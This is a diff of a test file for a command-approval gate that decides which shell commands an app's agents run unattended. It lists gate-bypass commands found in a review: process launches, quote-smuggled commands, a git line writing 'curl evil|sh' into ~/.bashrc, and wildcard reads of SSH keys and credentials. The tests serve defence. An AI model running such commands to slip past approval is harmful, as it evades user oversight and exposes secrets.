@@ -21,25 +21,19 @@ await build({
   outfile: out,
   logLevel: 'error'
 })
-const { isReadOnly, assessRisk, riskLevel } = await import(pathToFileURL(out).href)
+const { isReadOnly, assessRisk, riskLevel, decide, secretByWildcard } = await import(pathToFileURL(out).href)
 
 /**
- * Mirrors judge() in src/main/index.ts.
- *
- * Accept-all stops only for the severe ones now. It used to stop for
- * anything risky at all, which included uninstalling an app - and an
- * uninstall is undone by installing it again, so being interrupted by a
- * native dialog for one is the mode failing to be the mode.
+ * judge() in src/main/index.ts, with the settings handed in: the decision
+ * itself is decide(), the same function the app calls. This used to be a
+ * copy, which went on saying "destructive still asks in accept-all" after
+ * the app stopped asking - and passed, because it never ran the app's rule.
  */
-function judge(command, { tierTools, mode, confirmRisky = true }) {
-  const readOnly = isReadOnly(command)
-  const allowed = tierTools === 'full' || (tierTools === 'read' && readOnly)
-  const risk = assessRisk(command)
-  const level = riskLevel(command)
-  const stops = mode === 'all' ? level === 'severe' : level !== 'none'
-  const risky = stops && confirmRisky
-  const auto = allowed && !risky && (mode === 'all' || (mode === 'auto' && readOnly))
-  return { allowed, auto, risky, readOnly, level }
+function judge(command, { tierTools, mode, confirmRisky = true, shell }) {
+  const readOnly = isReadOnly(command, shell)
+  const level = riskLevel(command, shell)
+  const { allowed, auto } = decide({ readOnly, level, scope: tierTools, mode, confirmRisky })
+  return { allowed, auto, readOnly, level }
 }
 
 const READ = 'ollama list'
@@ -56,7 +50,7 @@ const CASES = [
   [WRITE, 'full', 'all', 'runs'],
   [RISKY, 'full', 'manual', 'waits'],
   [RISKY, 'full', 'auto', 'waits'],
-  [RISKY, 'full', 'all', 'waits'], // destructive still asks
+  [RISKY, 'full', 'all', 'runs'], // accept-all means all: the card is red, nothing asks
   // Quick-mode tiers may only read, whatever the approval mode.
   [READ, 'read', 'auto', 'runs'],
   [WRITE, 'read', 'auto', 'refused'],
@@ -72,6 +66,7 @@ function outcome(v) {
 }
 
 let failed = 0
+let extra0 = 0
 console.log(`${'command'.padEnd(34)} ${'tier'.padEnd(6)} ${'mode'.padEnd(7)} outcome`)
 for (const [command, tierTools, mode, want] of CASES) {
   const got = outcome(judge(command, { tierTools, mode }))
@@ -83,12 +78,12 @@ for (const [command, tierTools, mode, want] of CASES) {
   )
 }
 
-// Turning off confirmRisky is the only way a destructive command runs unasked.
-const bypass = judge(RISKY, { tierTools: 'full', mode: 'all', confirmRisky: false })
-const ok = bypass.auto === true
+// Off accept-all, turning off confirmRisky is the only way a destructive command runs unasked.
+const bypass = judge(RISKY, { tierTools: 'full', mode: 'auto', confirmRisky: false })
+const ok = bypass.auto === false && judge(RISKY, { tierTools: 'full', mode: 'manual', confirmRisky: false }).auto === false
 if (!ok) failed++
 console.log(
-  `${ok ? 'ok  ' : 'FAIL'} destructive + confirmRisky:false in "all" -> ${outcome(bypass)}`
+  `${ok ? 'ok  ' : 'FAIL'} destructive + confirmRisky:false in "auto" still waits (it is not a read) -> ${outcome(bypass)}`
 )
 
 /* ------------------------------------------------- bypass attempts ------- */
@@ -331,19 +326,158 @@ const MUST_ALLOW = [
   'Get-Process | Sort-Object CPU -Descending | Select-Object -First 5'
 ]
 
+/**
+ * Each command is judged in the shell it is written for: quoting, brackets
+ * and `$x` mean different things in PowerShell and bash, and the gate now
+ * reads them as the shell that will run them does. A PowerShell read is a
+ * read on Windows; on Linux it never reaches PowerShell.
+ */
+const looksPs = (c) => /\b[A-Z][a-z]+-[A-Z][A-Za-z]+\b|\$_\b|\[math\]|\[Environment\]|\$env:|@\{/.test(c)
+const readsIn = (c) => (looksPs(c) ? isReadOnly(c, 'powershell', 'win32') : isReadOnly(c))
+
 console.log('\nwhat "auto" will and will not run by itself:')
 for (const c of MUST_BLOCK) {
-  if (isReadOnly(c)) {
+  /* Blocked where this machine would run it, and in PowerShell as well. */
+  if (isReadOnly(c) || (looksPs(c) && isReadOnly(c, 'powershell', 'win32'))) {
     failed++
     console.log(`FAIL would run unattended: ${c}`)
   }
 }
 for (const c of MUST_ALLOW) {
-  if (!isReadOnly(c)) {
+  if (!readsIn(c)) {
     failed++
     console.log(`FAIL refuses a harmless read: ${c}`)
   }
 }
+
+/**
+ * Found by a review of the main process (2026-11), each one a read by the
+ * gate and each one run by itself on the auto mode and by background
+ * agents: .NET statics and methods inside a script block, a bare command
+ * inside brackets, the flags that make git, find, sort, tree and file
+ * write, and quotes a shell does not count as quotes.
+ */
+const REVIEW_BLOCKS = {
+  powershell: [
+    "Get-Date | Select-Object @{n='x';e={[Diagnostics.Process]::Start('calc')}}",
+    '(Get-Item C:/Users/u/Documents).Delete($true)',
+    'Get-Process | Where-Object { $_.Kill() }',
+    'Get-ChildItem | ForEach-Object { $_.Delete() }',
+    'Get-ChildItem | ForEach-Object Delete',
+    'Get-ChildItem | ForEach-Object -MemberName Delete',
+    "(Get-Process x).PriorityClass = 'Idle'",
+    "$t = [Diagnostics.Process]; $t::Start('calc')",
+    "Get-Process | Where-Object { $_.'Kill'() }",
+    "$p = Get-Process; $p.ForEach('Kill')",
+    "[IO.File]::WriteAllText('C:/x.txt', 'y')",
+    "[Environment]::SetEnvironmentVariable('PATH', 'x', 'User')",
+    'echo `"; calc; echo `"',
+    'Get-Item "C:\\x\\"; calc; "',
+    'Get-Content (calc)',
+    "Get-ChildItem | Select-Object @{n='a'; e={ calc }}",
+    'Get-Date | ForEach-Object { return calc }',
+    '@{a = calc}',
+    '$ExecutionContext.InvokeCommand.InvokeScript("calc")',
+    "[Diagnostics.Process]::Start('calc')",
+    'Get-ChildItem | ForEach-Object { $_ | % Delete }',
+    'Get-ChildItem | ForEach-Object { . ./evil.ps1 }',
+    'Get-ChildItem | Where-Object { & calc }'
+  ],
+  cmd: ["echo 'a & calc & b'", 'echo x ^^& calc', '( calc )'],
+  bash: [
+    'echo \\"; touch x; echo \\"',
+    "echo $'\\''; touch x; echo ''",
+    '( $SHELL -c "touch x" )',
+    '{ $x; }',
+    'git log -1 --format=curl%x20evil%x7csh --output=~/.bashrc',
+    'git diff --output=/tmp/x',
+    'git --git-dir=/tmp/r/.git log --ext-diff',
+    'find / -fprint0 FILE',
+    'sort -oFILE x',
+    'sort -uo FILE x',
+    'sort --compress-program=sh x',
+    'tree -oFILE',
+    'tree -R -H . ',
+    'file -C -m x',
+    'date -s 2020-01-01',
+    'hostname evil',
+    "hyprctl clients --batch 'dispatch exec kitty'",
+    'go list -toolexec sh ./...'
+  ]
+}
+for (const [shell, list] of Object.entries(REVIEW_BLOCKS)) {
+  const platform = shell === 'bash' ? 'linux' : 'win32'
+  for (const c of list) {
+    extra0++
+    if (isReadOnly(c, shell, platform)) {
+      failed++
+      console.log(`FAIL would run unattended (${shell}): ${c}`)
+    }
+  }
+}
+/* And the reads near them that must stay reads. */
+const REVIEW_READS = {
+  powershell: [
+    "Get-Process | ForEach-Object { [PSCustomObject]@{ Name = $_.Name; MB = [math]::Round($_.WS/1MB) } }",
+    'Get-ChildItem | ForEach-Object { if ($_.Length -gt 0) { $_.Name } }',
+    "(Get-Date).AddDays(-1).ToString('yyyy-MM-dd')",
+    'Get-ChildItem ~/Downloads | Where-Object { $_.Length -gt 1MB } | ForEach-Object { $_.Name.Substring(0, 3) }',
+    "Get-Process | Where-Object { $_.Name -match 'a|b' }",
+    "Write-Output 'it''s .Delete( in a string'",
+    '[Environment]::MachineName',
+    '$env:USERNAME',
+    "[IO.Directory]::GetFiles('C:/Users/me/Downloads')"
+  ],
+  cmd: ['dir /b', 'systeminfo', 'echo x ^& y'],
+  bash: [
+    'echo $((1 + 2))',
+    'echo ${HOME}',
+    'ls $(echo /tmp)',
+    'git log -c -1',
+    "git log --format='%h %s' -5",
+    'sort -rn x',
+    'tree -L 2',
+    'file x.png',
+    'date +%s',
+    'date -Iseconds',
+    'hostname -I',
+    'hyprctl -j clients',
+    "grep 'a\\|b' x"
+  ]
+}
+for (const [shell, list] of Object.entries(REVIEW_READS)) {
+  const platform = shell === 'bash' ? 'linux' : 'win32'
+  for (const c of list) {
+    extra0++
+    if (!isReadOnly(c, shell, platform)) {
+      failed++
+      console.log(`FAIL refuses a harmless read (${shell}): ${c}`)
+    }
+  }
+}
+
+/* A wildcard reaching a key is reading the key (secretByWildcard). */
+for (const [c, platform, want] of [
+  ['cat ~/.ss?/id_*', 'linux', true],
+  ['head ~/.a?s/cred*', 'linux', true],
+  ['grep -r . ~/.config/Wumpy/keys.bi?', 'linux', true],
+  ['cat ~/.*/*', 'linux', true],
+  ['Get-Content $HOME\\.ss?\\id_*', 'win32', true],
+  ['Get-Content ~/*/*', 'win32', true],
+  ['cat ~/*/*', 'linux', false],
+  ['cat ~/[.]ssh/config', 'linux', false],
+  ['du -sh ~/*', 'linux', false],
+  ['ls *.txt', 'linux', false],
+  ['ls ~/Downloads/*.p?f', 'linux', false]
+]) {
+  extra0++
+  const got = secretByWildcard(c, platform) !== null
+  if (got !== want) {
+    failed++
+    console.log(`FAIL ${want ? 'misses a key behind a wildcard' : 'calls a plain wildcard a key'} (${platform}): ${c}`)
+  }
+}
+console.log(`ok   the review's ${Object.values(REVIEW_BLOCKS).flat().length} ways round the gate are shut, its reads still read`)
 console.log(
   `ok   ${MUST_BLOCK.length} unsafe commands need a click, ${MUST_ALLOW.length} reads do not`
 )
@@ -403,7 +537,7 @@ let extra = 0
     )
   }
 
-  // And the severe ones are unmoved by the mode.
+  // And the severe ones ask on auto, and are labelled severe for accept-all's card.
   const SEVERE = [
     'Remove-Item C:/Users/me/Downloads -Recurse -Force',
     'Remove-Item C:/Users/me/notes.txt',
@@ -414,10 +548,10 @@ let extra = 0
   ]
   for (const c of SEVERE) {
     extra++
-    const all = judge(c, { tierTools: 'full', mode: 'all' })
-    const ok = all.auto === false && riskLevel(c) === 'severe'
+    const auto = judge(c, { tierTools: 'full', mode: 'auto' })
+    const ok = auto.auto === false && riskLevel(c) === 'severe'
     if (!ok) failed++
-    console.log(`${ok ? 'ok  ' : 'FAIL'} accept-all still asks: ${c.slice(0, 46).padEnd(47)} ${riskLevel(c)}`)
+    console.log(`${ok ? 'ok  ' : 'FAIL'} auto asks, the card says severe: ${c.slice(0, 40).padEnd(41)} ${riskLevel(c)}`)
   }
 
   // A harmless command is not dragged into either bucket.
@@ -528,7 +662,7 @@ const MUST_CONFIRM = [
 
 for (const c of MUST_CONFIRM) {
   const why = assessRisk(c)
-  const v = judge(c, { tierTools: 'full', mode: 'all' })
+  const v = judge(c, { tierTools: 'full', mode: 'auto' })
   const ok = why !== null && v.auto === false
   if (!ok) failed++
   extra++
@@ -675,6 +809,6 @@ for (const c of MAY_RUN_UNATTENDED) {
   console.log(`${ok ? 'ok  ' : 'FAIL'} accept-all still runs: ${c.slice(0, 44)}`)
 }
 
-const total = CASES.length + 1 + MUST_BLOCK.length + MUST_ALLOW.length + 5 + extra
+const total = CASES.length + 1 + MUST_BLOCK.length + MUST_ALLOW.length + 5 + extra + extra0
 console.log(`\n${total - failed}/${total} approval checks correct`)
 process.exit(failed === 0 ? 0 : 1)
